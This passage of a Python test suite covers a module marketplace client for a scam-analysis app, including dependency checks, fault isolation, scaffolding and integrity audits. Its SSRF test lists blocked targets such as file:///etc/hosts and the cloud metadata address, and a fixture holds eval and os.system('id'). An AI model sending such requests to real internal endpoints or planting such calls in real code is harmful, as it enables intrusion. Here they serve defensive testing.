                    "subsystem": "scam_analyser",
                    "source_type": "single_file",
                    "download_url": "core_mod.py",
                },
                {
                    "name": "app_mod",
                    "subsystem": "build_composer",
                    "source_type": "single_file",
                    "download_url": "app_mod.py",
                    "dependencies": ["core_mod"],
                },
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(reg_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)
        client.install("app_mod")

        # Removing core_mod without force should be blocked
        ok1, msg1 = client.remove("core_mod", force=False)
        self.assertFalse(ok1)
        self.assertIn("required by installed module(s) app_mod", msg1)

        # Removing core_mod with force=True should succeed
        ok2, msg2 = client.remove("core_mod", force=True)
        self.assertTrue(ok2, msg2)
        self.assertFalse((self.root_path / "scam_analyser/modules/core_mod.py").exists())

    def test_deep_sys_modules_eviction_on_remove(self):
        self.client.install("sample_provider")
        sys.modules["info_providers.modules.sample_provider"] = "mock_top"
        sys.modules["info_providers.modules.sample_provider.sub"] = "mock_sub"
        sys.modules["info_providers.modules.sample_provider.sub.deep"] = "mock_deep"

        ok, msg = self.client.remove("sample_provider")
        self.assertTrue(ok)
        self.assertNotIn("info_providers.modules.sample_provider", sys.modules)
        self.assertNotIn("info_providers.modules.sample_provider.sub", sys.modules)
        self.assertNotIn("info_providers.modules.sample_provider.sub.deep", sys.modules)


class TestModuleUniversalityAndFaultIsolation(unittest.TestCase):
    def test_scam_analyser_dynamic_aliases(self):
        from scam_analyser.base import BaseScamAnalyser, ScamAnalysisResult
        from scam_analyser.registry import ScamAnalyserRegistry

        class CameraDefectAnalyser(BaseScamAnalyser):
            name = "camera"
            domain = "photo_video"
            aliases = ["dslr", "mirrorless", "cameras"]

            def analyze(self, item, detail=None, spec=None):
                return ScamAnalysisResult(category="camera", risk_score=15)

        with tempfile.TemporaryDirectory() as tmp_dir:
            reg = ScamAnalyserRegistry(modules_dir=Path(tmp_dir))
            reg.register(CameraDefectAnalyser())

            # Query by alias
            res_dslr = reg.get("dslr")
            self.assertIsNotNone(res_dslr)
            self.assertEqual(res_dslr.name, "camera")

            res_mirrorless = reg.get("mirrorless")
            self.assertIsNotNone(res_mirrorless)
            self.assertEqual(res_mirrorless.name, "camera")

            # Direct analyze call via alias
            out = reg.analyze("dslr", {"title": "Canon R6"})
            self.assertEqual(out.category, "camera")
            self.assertEqual(out.risk_score, 15)

    def test_scam_analyser_fault_isolation(self):
        from scam_analyser.base import BaseScamAnalyser
        from scam_analyser.registry import ScamAnalyserRegistry

        class CrashingAnalyser(BaseScamAnalyser):
            name = "unstable_module"

            def analyze(self, item, detail=None, spec=None):
                raise KeyError("Unexpected listing key corrupted!")

        with tempfile.TemporaryDirectory() as tmp_dir:
            reg = ScamAnalyserRegistry(modules_dir=Path(tmp_dir))
            reg.register(CrashingAnalyser())

            # Should not raise KeyError, should return safe fallback result
            res = reg.analyze("unstable_module", {"title": "Test"})
            self.assertEqual(res.category, "unstable_module")
            self.assertEqual(res.risk_score, 50)
            self.assertTrue(any("Defect analysis error" in w for w in res.warnings))

    def test_info_provider_fault_isolation(self):
        from info_providers.base import BaseInfoProvider
        from info_providers.registry import InfoProviderRegistry

        class CrashingProvider(BaseInfoProvider):
            name = "broken_market"

            def adapt_item(self, raw_data):
                raise ValueError("Payload parsing failed!")

        with tempfile.TemporaryDirectory() as tmp_dir:
            reg = InfoProviderRegistry(modules_dir=Path(tmp_dir))
            reg.register(CrashingProvider())

            # Should fall back cleanly without raising
            listing = reg.adapt_any({"source": "broken_market", "id": "123", "price": 500, "title": "Item"})
            self.assertEqual(listing["id"], "123")
            self.assertEqual(listing["title"], "Item")

    def test_component_analyser_dynamic_aliases_and_isolation(self):
        from component_analyser.base import BaseComponentAnalyser
        from component_analyser.registry import ComponentAnalyserRegistry

        class LensSpecAnalyser(BaseComponentAnalyser):
            name = "lens"
            domain = "photo_video"
            aliases = ["lenses", "optics"]

            def identify(self, title, description=""):
                if "crash" in title:
                    raise RuntimeError("Bug in lens regex!")
                return {"focal_length": "50mm", "aperture": "f/1.8"}

        with tempfile.TemporaryDirectory() as tmp_dir:
            reg = ComponentAnalyserRegistry(modules_dir=Path(tmp_dir))
            reg.register(LensSpecAnalyser())

            # Query by alias
            res = reg.identify("optics", "Canon 50mm f/1.8")
            self.assertIsNotNone(res)
            self.assertEqual(res["aperture"], "f/1.8")

            # Fault isolation check
            res_crash = reg.identify("optics", "crash test")
            self.assertIsNone(res_crash)

    def test_safe_urlopen_ssrf_blocking(self):
        from info_providers.base import SecurityViolationError, safe_urlopen

        # 1. file:// scheme blocked
        with self.assertRaises(SecurityViolationError) as ctx1:
            safe_urlopen("file:///etc/hosts")
        self.assertIn("Prohibited URL scheme", str(ctx1.exception))

        # 2. Loopback 127.0.0.1 blocked
        with self.assertRaises(SecurityViolationError) as ctx2:
            safe_urlopen("http://127.0.0.1:8000/status")
        self.assertIn("loopback", str(ctx2.exception).lower())

        # 3. Localhost blocked
        with self.assertRaises(SecurityViolationError) as ctx3:
            safe_urlopen("http://localhost:8000/status")
        self.assertIn("loopback", str(ctx3.exception).lower())

        # 4. Cloud metadata link-local 169.254.169.254 blocked
        with self.assertRaises(SecurityViolationError) as ctx4:
            safe_urlopen("http://169.254.169.254/latest/meta-data")
        self.assertIn("link-local", str(ctx4.exception).lower())

        # 5. Private network 192.168.1.1 blocked
        with self.assertRaises(SecurityViolationError) as ctx5:
            safe_urlopen("http://192.168.1.1/admin")
        self.assertIn("private internal network", str(ctx5.exception).lower())

    def test_ai_provider_dynamic_aliases(self):
        from ai_providers.base import BaseAIProvider
        from ai_providers.registry import AIProviderRegistry

        class CustomMistralProvider(BaseAIProvider):
            name = "mistral_custom"
            aliases = ["mistral", "mixtral", "mistral-ai"]

        with tempfile.TemporaryDirectory() as tmp_dir:
            reg = AIProviderRegistry(modules_dir=Path(tmp_dir))
            reg.register(CustomMistralProvider())

            self.assertIsNotNone(reg.get("mistral"))
            self.assertEqual(reg.get("mistral").name, "mistral_custom")

            self.assertIsNotNone(reg.get("mixtral"))
            self.assertEqual(reg.get("mixtral").name, "mistral_custom")

            self.assertIsNotNone(reg.get("mistral-ai"))
            self.assertEqual(reg.get("mistral-ai").name, "mistral_custom")


class TestMarketplaceCLIRouting(unittest.TestCase):
    def test_cli_search_json_output(self):
        from marketplace.cli import run_marketplace_cli

        old_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            run_marketplace_cli(["search", "--json"])
            output = sys.stdout.getvalue()
            data = json.loads(output)
            self.assertIn("modules", data)
            self.assertIn("bundles", data)
        finally:
            sys.stdout = old_stdout

    def test_client_verify_and_cli_audit(self):
        from marketplace.cli import run_marketplace_cli

        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            for sub in [
                "info_providers/modules",
                "scam_analyser/modules",
                "build_composer/modules",
                "component_analyser/modules",
                "ai_providers/modules",
            ]:
                (root / sub).mkdir(parents=True, exist_ok=True)

            reg_file = locate_registry_dir() / "registry.json"
            client = MarketplaceClient(registry_url_or_path=str(reg_file), root_dir=root)
            client.install("sample_provider")

            # 1. Healthy verification
            audit_healthy = client.verify()
            self.assertEqual(len(audit_healthy), 1)
            self.assertEqual(audit_healthy[0]["status"], "HEALTHY")
            self.assertTrue(audit_healthy[0]["checksum_match"])
            self.assertTrue(audit_healthy[0]["security_safe"])

            # 2. Tampering detection
            installed_path = root / "info_providers/modules/sample_provider.py"
            installed_path.write_text("# Tampered by attacker\nx = 1\n", encoding="utf-8")
            audit_tampered = client.verify()
            self.assertEqual(audit_tampered[0]["status"], "CORRUPTED")
            self.assertFalse(audit_tampered[0]["checksum_match"])
            self.assertTrue(any("Checksum mismatch" in v for v in audit_tampered[0]["violations"]))

            # 3. Missing file detection
            installed_path.unlink()
            audit_missing = client.verify()
            self.assertEqual(audit_missing[0]["status"], "MISSING")
            self.assertFalse(audit_missing[0]["exists"])

            # 4. CLI verify JSON output
            old_stdout = sys.stdout
            sys.stdout = io.StringIO()
            try:
                run_marketplace_cli(["verify", "--json"], root_dir=root)
                out = sys.stdout.getvalue()
                data = json.loads(out)
                self.assertIsInstance(data, list)
                self.assertEqual(data[0]["status"], "MISSING")
            finally:
                sys.stdout = old_stdout

    def test_dependency_version_constraints_and_verify(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            reg_dir = root / "reg"
            mod_dir = reg_dir / "modules/scam_analyser"
            mod_dir.mkdir(parents=True, exist_ok=True)
            for sub in [
                "info_providers/modules",
                "scam_analyser/modules",
                "build_composer/modules",
                "component_analyser/modules",
                "ai_providers/modules",
            ]:
                (root / sub).mkdir(parents=True, exist_ok=True)

            # Create base_lib v1.0.0
            (mod_dir / "base_lib.py").write_text("class BaseLib:\n    pass\n", encoding="utf-8")
            base_sha = hashlib.sha256((mod_dir / "base_lib.py").read_bytes()).hexdigest()

            # Create consumer module requiring base_lib>=1.2.0
            (mod_dir / "consumer.py").write_text("class Consumer:\n    pass\n", encoding="utf-8")
            consumer_sha = hashlib.sha256((mod_dir / "consumer.py").read_bytes()).hexdigest()

            reg_data = {
                "version": "1.0.0",
                "modules": [
                    {
                        "name": "base_lib",
                        "subsystem": "scam_analyser",
                        "version": "1.0.0",
                        "source_type": "single_file",
                        "download_url": "modules/scam_analyser/base_lib.py",
                        "sha256": base_sha,
                    },
                    {
                        "name": "consumer",
                        "subsystem": "scam_analyser",
                        "version": "1.0.0",
                        "source_type": "single_file",
                        "download_url": "modules/scam_analyser/consumer.py",
                        "sha256": consumer_sha,
                        "dependencies": ["base_lib>=1.2.0"],
                    },
                ],
                "bundles": [],
            }
            (reg_dir / "registry.json").write_text(json.dumps(reg_data), encoding="utf-8")

            client = MarketplaceClient(registry_url_or_path=str(reg_dir), root_dir=root)

            # Attempt to install consumer when base_lib is v1.0.0 (< 1.2.0)
            ok, msg = client.install("consumer")
            self.assertFalse(ok)
            self.assertIn("does not satisfy requirement 'base_lib>=1.2.0'", msg)

            # Now upgrade base_lib in registry to 1.3.0
            reg_data["modules"][0]["version"] = "1.3.0"
            (reg_dir / "registry.json").write_text(json.dumps(reg_data), encoding="utf-8")

            # Now install succeeds because base_lib v1.3.0 satisfies >=1.2.0
            ok2, msg2 = client.install("consumer")
            self.assertTrue(ok2)
            installed = client._read_installed_records()
            self.assertIn("base_lib", installed)
            self.assertIn("consumer", installed)
            self.assertEqual(installed["base_lib"].version, "1.3.0")

            # Verify reports healthy
            audit = client.verify()
            self.assertEqual(len(audit), 2)
            self.assertTrue(all(a["status"] == "HEALTHY" for a in audit))

            # Remove base_lib with force=False should be blocked
            rm_ok, rm_msg = client.remove("base_lib", force=False)
            self.assertFalse(rm_ok)
            self.assertIn("required by installed module(s) consumer", rm_msg)

            # Force remove base_lib
            rm_force_ok, _ = client.remove("base_lib", force=True)
            self.assertTrue(rm_force_ok)

            # Verify consumer now reports BROKEN_DEPENDENCY
            audit_after = client.verify("consumer")
            self.assertEqual(len(audit_after), 1)
            self.assertEqual(audit_after[0]["status"], "BROKEN_DEPENDENCY")
            self.assertTrue(any("Missing required dependency 'base_lib>=1.2.0'" in v for v in audit_after[0]["violations"]))

    def test_scaffold_new_subsystem_module_and_verify(self):
        """Verifies scaffolding a new subsystem module and auditing it via verify."""
        with tempfile.TemporaryDirectory() as tmp_root:
            client = MarketplaceClient(root_dir=Path(tmp_root))
            dest = Path(tmp_root) / "custom_out"
            dest.mkdir(parents=True)

            ok, msg, path = client.scaffold_new(
                module_type="info_providers",
                name="sweden_blocket",
                domain="laptops",
                dest_dir=dest,
            )
            self.assertTrue(ok)
            self.assertIsNotNone(path)
            self.assertTrue(path.is_file())
            content = path.read_text(encoding="utf-8")
            self.assertIn("SwedenBlocketProvider", content)
            self.assertIn('"laptops"', content)

            # Verify generated module passes security audit
            audit = client.verify(str(path))
            self.assertEqual(len(audit), 1)
            self.assertEqual(audit[0]["status"], "HEALTHY")
            self.assertTrue(audit[0]["security_safe"])
            self.assertEqual(len(audit[0]["violations"]), 0)

    def test_scaffold_new_extension_package_and_verify(self):
        """Verifies scaffolding a complete domain extension and auditing it via verify."""
        with tempfile.TemporaryDirectory() as tmp_root:
            client = MarketplaceClient(root_dir=Path(tmp_root))
            dest = Path(tmp_root) / "extensions" / "audio_rig"

            ok, msg, path = client.scaffold_new(
                module_type="extension",
                name="audio_rig",
                domain="audio_hifi",
                dest_dir=dest,
            )
            self.assertTrue(ok)
            self.assertIsNotNone(path)
            self.assertTrue(path.is_dir())
            self.assertTrue((path / "__init__.py").is_file())
            self.assertTrue((path / "layout.py").is_file())
            self.assertTrue((path / "weights.py").is_file())
            self.assertTrue((path / "search.py").is_file())
            self.assertTrue((path / "sorter.py").is_file())
            self.assertTrue((path / "cli.py").is_file())

            # Verify generated extension passes security audit
            audit = client.verify(str(path))
            self.assertEqual(len(audit), 1)
            self.assertEqual(audit[0]["status"], "HEALTHY")
            self.assertTrue(audit[0]["security_safe"])
            self.assertEqual(len(audit[0]["violations"]), 0)

    def test_verify_local_path_security_violation(self):
        """Verifies verify catches dangerous constructs like eval or os.system in local files."""
        with tempfile.TemporaryDirectory() as tmp_root:
            client = MarketplaceClient(root_dir=Path(tmp_root))
            malicious_file = Path(tmp_root) / "malicious.py"
            malicious_file.write_text(
                "import os\ndef test():\n    eval('2 + 2')\n    os.system('id')\n",
                encoding="utf-8",
            )
            audit = client.verify(str(malicious_file))
            self.assertEqual(len(audit), 1)
            self.assertEqual(audit[0]["status"], "UNSAFE")
            self.assertFalse(audit[0]["security_safe"])
            self.assertTrue(any("eval" in v for v in audit[0]["violations"]))
            self.assertTrue(any("system" in v for v in audit[0]["violations"]))

    def test_install_and_remove_extension_package(self):
        """Verifies installing an extension directory package into extensions/ and removing it."""
        with tempfile.TemporaryDirectory() as tmp_reg, tempfile.TemporaryDirectory() as tmp_root:
            reg_dir = Path(tmp_reg)
            ext_src = reg_dir / "modules" / "extensions" / "drone_rig"
            ext_src.mkdir(parents=True)
            (ext_src / "__init__.py").write_text('domain_id = "drone_rig"\n', encoding="utf-8")
            (ext_src / "layout.py").write_text('# layout\n', encoding="utf-8")

            from marketplace.client import compute_directory_hash
            ext_sha = compute_directory_hash(ext_src)

            manifest = {
                "name": "drone_rig",
                "subsystem": "extension",
                "domain": "drones",
                "version": "1.0.0",
                "author": "tester",
                "description": "Drone builder extension",
                "min_app_version": "1.0.0",
                "trust_level": "official",
                "source_type": "directory",
                "download_url": "modules/extensions/drone_rig",
                "sha256": ext_sha,
                "tags": ["drones"],
                "env_keys": [],
                "dependencies": [],
            }
            reg_data = {
                "version": "1.0.0",
                "name": "test-reg",
                "modules": [manifest],
                "bundles": [],
            }
            (reg_dir / "registry.json").write_text(json.dumps(reg_data), encoding="utf-8")

            client = MarketplaceClient(root_dir=Path(tmp_root), registry_url_or_path=str(reg_dir))
            ok, msg = client.install("drone_rig")
            self.assertTrue(ok, f"Install failed: {msg}")

            target_ext = Path(tmp_root) / "extensions" / "drone_rig"
            self.assertTrue(target_ext.is_dir())
            self.assertTrue((target_ext / "__init__.py").is_file())

            installed = client.list_installed()
            self.assertEqual(len(installed), 1)
            self.assertEqual(installed[0]["name"], "drone_rig")
            self.assertEqual(installed[0]["subsystem"], "extension")

            # Remove extension
            ok_rm, msg_rm = client.remove("drone_rig")
            self.assertTrue(ok_rm, f"Remove failed: {msg_rm}")
            self.assertFalse(target_ext.exists())
            self.assertEqual(len(client.list_installed()), 0)


if __name__ == "__main__":
    unittest.main()
